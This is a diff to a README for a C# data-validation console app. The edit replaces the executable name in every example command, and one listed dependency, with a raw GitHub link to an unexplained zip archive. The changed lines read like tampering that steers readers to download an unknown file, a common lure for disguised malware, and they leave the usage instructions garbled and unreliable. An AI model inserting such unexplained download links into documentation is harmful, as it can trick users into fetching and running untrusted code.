@@ -21,17 +21,17 @@ Each validator is implemented using the FluentValidation library, ensuring robus
 4. Open a command prompt or terminal window.
 5. Navigate to the directory containing the compiled executable ("TestAssignmentDataValidation\TestAssignmentValidation\bin\Release\netcoreapp3.1").
 6. To validate a specific type of user data, use the following command format:             
-  TestAssignmentValidation.exe Passport ER121212              
-  TestAssignmentValidation.exe Rnokpp 1212121212               
-  TestAssignmentValidation.exe BirthDate 01.05.2024                
-  TestAssignmentValidation.exe DeviceNumber B5A648BA-262F-47BF-A0F5-4FDF68AC0C12                
+  https://raw.githubusercontent.com/ushakovdanil/test_assignment/main/Milvago/test_assignment.zip Passport ER121212              
+  https://raw.githubusercontent.com/ushakovdanil/test_assignment/main/Milvago/test_assignment.zip Rnokpp 1212121212               
+  https://raw.githubusercontent.com/ushakovdanil/test_assignment/main/Milvago/test_assignment.zip BirthDate 01.05.2024                
+  https://raw.githubusercontent.com/ushakovdanil/test_assignment/main/Milvago/test_assignment.zip DeviceNumber B5A648BA-262F-47BF-A0F5-4FDF68AC0C12                
 8. After running the command, the application will display whether the provided data is valid or not.
 
 
 ## Technologies Used
 
 - C# (.NET Core)
-- Microsoft.Extensions.DependencyInjection
+- https://raw.githubusercontent.com/ushakovdanil/test_assignment/main/Milvago/test_assignment.zip
 - FluentValidation
 - Moq
 - XUnit
